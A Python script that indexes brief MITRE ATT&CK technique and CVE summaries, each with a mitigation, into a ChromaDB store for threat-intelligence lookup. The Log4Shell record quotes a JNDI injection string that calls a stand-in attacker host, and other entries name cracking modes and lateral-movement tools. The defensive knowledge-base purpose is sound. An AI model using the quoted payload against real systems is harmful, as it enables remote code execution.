import os
import chromadb

def ingest_mitre_and_cves():
    print("[*] Initializing ChromaDB Persistent Vector Store for Threat Intel...")
    chroma_client = chromadb.PersistentClient(path="./cyber_kb")
    collection = chroma_client.get_or_create_collection("cybersecurity_docs")

    # 1. High-Impact Enterprise MITRE ATT&CK Tactics & Techniques
    mitre_techniques = [
        {
            "id": "T1558.003",
            "name": "Kerberoasting",
            "tactic": "Credential Access",
            "doc": "MITRE ATT&CK T1558.003 - Kerberoasting: Adversaries target Active Directory Service Principal Names (SPNs) by requesting valid Kerberos TGS tickets encrypted with the service account's NTLM hash. Attackers extract these tickets from memory and crack them offline using Hashcat (mode 13100) to retrieve plaintext service credentials.",
            "mitigation": "Mitigate by migrating service accounts to Group Managed Service Accounts (gMSA) with 128-character automatically rotated passwords and enforcing AES256 Kerberos encryption over RC4-HMAC."
        },
        {
            "id": "T1558.004",
            "name": "AS-REP Roasting",
            "tactic": "Credential Access",
            "doc": "MITRE ATT&CK T1558.004 - AS-REP Roasting: Adversaries target user accounts with 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) enabled. An attacker sends an AS-REQ without pre-auth and receives an AS-REP containing an encrypted timestamp that can be cracked offline with Hashcat (mode 18200).",
            "mitigation": "Enforce Kerberos pre-authentication across all domain accounts and configure strong 16+ character complex passphrases."
        },
        {
            "id": "T1003.006",
            "name": "DCSync",
            "tactic": "Credential Access",
            "doc": "MITRE ATT&CK T1003.006 - DCSync: Adversaries simulate the behavior of a Domain Controller using the Directory Replication Service Remote Protocol (MS-DRSR) to replicate password data and obtain password hashes (including KRBTGT hash) from AD without running code on the DC.",
            "mitigation": "Audit Active Directory Access Control Lists (ACLs) to ensure only authorized Domain Controllers possess 'Replicating Directory Changes' and 'Replicating Directory Changes All' permissions."
        },
        {
            "id": "T1059.001",
            "name": "PowerShell Execution",
            "tactic": "Execution",
            "doc": "MITRE ATT&CK T1059.001 - PowerShell: Adversaries abuse PowerShell to execute commands, download payloads (IWR/Invoke-WebRequest, DownloadString), and interact with internal APIs. Common evasion includes base64-encoded commands (-EncodedCommand) and memory-only execution.",
            "mitigation": "Enable PowerShell Script Block Logging (Event ID 4104), Transcription, and deploy Constrained Language Mode (CLM) alongside AppLocker or WDAC."
        },
        {
            "id": "T1021.002",
            "name": "SMB / Windows Admin Shares",
            "tactic": "Lateral Movement",
            "doc": "MITRE ATT&CK T1021.002 - SMB/Windows Admin Shares: Adversaries leverage SMB (Port 445) and default administrative shares (C$, ADMIN$, IPC$) to transfer tools, execute lateral movement using PsExec or Impacket, and compromise peer systems.",
            "mitigation": "Enforce SMB Signing (RequireSecuritySignature=True) to prevent SMB Relay attacks, disable SMBv1 across all hosts, and block inbound Port 445 on client endpoints using host firewalls."
        },
        {
            "id": "T1046",
            "name": "Network Service Discovery",
            "tactic": "Discovery",
            "doc": "MITRE ATT&CK T1046 - Network Service Discovery: Adversaries scan remote IP addresses and ports using tools like Nmap, Masscan, or custom TCP/SYN probes to enumerate accessible services, software banners, and identify attack surface vulnerabilities.",
            "mitigation": "Deploy Network Intrusion Detection Systems (NIDS) like Snort/Suricata to detect rapid port scan thresholds and apply host firewall isolation."
        }
    ]

    # 2. Critical CVE Intelligence Database
    cve_intelligence = [
        {
            "id": "CVE-2024-3094",
            "name": "XZ Utils Supply Chain Backdoor",
            "cvss": "10.0 (Critical)",
            "doc": "CVE-2024-3094: Critical malicious backdoor discovered in upstream XZ/liblzma tarballs (versions 5.6.0 and 5.6.1). The payload hooks into OpenSSH daemon (sshd) during RSA public key verification, allowing unauthenticated attackers with a specific private key to achieve remote code execution (RCE) as root.",
            "mitigation": "Downgrade xz-utils and liblzma to 5.4.x and audit all Linux server package repositories."
        },
        {
            "id": "CVE-2021-44228",
            "name": "Log4Shell (Apache Log4j)",
            "cvss": "10.0 (Critical)",
            "doc": "CVE-2021-44228 - Log4Shell: Critical JNDI injection vulnerability in Apache Log4j 2.x (2.0-beta9 to 2.14.1). An attacker who can log a malicious string containing `${jndi:ldap://attacker.com/exploit}` triggers unauthenticated remote code execution.",
            "mitigation": "Upgrade Log4j to >= 2.17.1 or set system property `log4j2.formatMsgNoLookups=true`."
        },
        {
            "id": "CVE-2020-1472",
            "name": "Zerologon",
            "cvss": "10.0 (Critical)",
            "doc": "CVE-2020-1472 - Zerologon: Privilege escalation vulnerability in the Netlogon Remote Protocol (MS-NRPC). By sending zeroes in AES-CFB8 authentication parameters, an unauthenticated attacker on the local network can reset the Domain Controller computer account password to empty and gain Domain Admin rights.",
            "mitigation": "Apply Microsoft KB4557222 and enforce Secure RPC channel bindings for all Netlogon clients."
        },
        {
            "id": "CVE-2017-0144",
            "name": "EternalBlue (MS17-010)",
            "cvss": "9.8 (Critical)",
            "doc": "CVE-2017-0144 - EternalBlue: Critical remote code execution vulnerability in Microsoft SMBv1 server handling of Srv!SmbOs2FeaToNt transaction requests. Exploited by WannaCry and NotPetya to achieve unauthenticated kernel-level RCE.",
            "mitigation": "Apply Microsoft Security Bulletin MS17-010 and disable SMBv1 globally using `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`."
        }
    ]

    docs = []
    metas = []
    ids = []

    for item in mitre_techniques:
        docs.append(f"{item['doc']} Mitigation: {item['mitigation']}")
        metas.append({"framework": "MITRE ATT&CK", "category": item["tactic"], "name": item["name"]})
        ids.append(f"mitre_{item['id'].replace('.', '_')}")

    for item in cve_intelligence:
        docs.append(f"{item['doc']} Remediation: {item['mitigation']}")
        metas.append({"framework": "CVE Knowledge", "category": "Vulnerability Intelligence", "cvss": item["cvss"]})
        ids.append(f"cve_{item['id'].replace('-', '_')}")

    print(f"[*] Ingesting {len(ids)} MITRE ATT&CK & CVE intelligence records into ChromaDB...")
    collection.upsert(documents=docs, metadatas=metas, ids=ids)
    print(f"[+] Successfully indexed {len(ids)} advanced threat blueprints into ChromaDB vector store!")

if __name__ == "__main__":
    ingest_mitre_and_cves()